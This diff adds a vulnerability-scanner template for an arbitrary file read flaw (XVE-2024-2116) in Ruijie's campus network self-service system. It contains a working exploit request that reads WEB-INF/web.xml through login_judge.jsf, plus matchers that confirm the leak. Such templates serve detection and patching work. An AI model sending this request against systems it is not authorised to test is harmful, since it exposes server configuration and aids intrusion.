@@ -1,0 +1,33 @@
+id: ruijie-judge-jsf-File-reading
+
+info:
+  name: 锐捷校园网自助服务系统 login_judge.jsf 任意文件读取漏洞(XVE-2024-2116)
+  author: Superhero
+  severity: medium
+  description: |-
+    body="校园网自助服务系统"
+    校园网自助服务系统/selfservice/selfservice/module/scgroup/web/login judge.jsf接囗处存在任意文件读取漏洞经过分析和研判，该漏洞利用难度低，可导致敏感信息泄漏，建议尽快修复。
+  reference:
+    - https://blog.csdn.net/m0_60571842/article/details/139510684
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /selfservice/selfservice/module/scgroup/web/login_judge.jsf?view=./WEB-INF/web.xml%3F HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml version='
+          - '<web-app'
+          - '</web-app>'
+          - '<context-param>'
+          - '</context-param>'
+        condition: and
+      - type: status
+        status: 
+          - 200
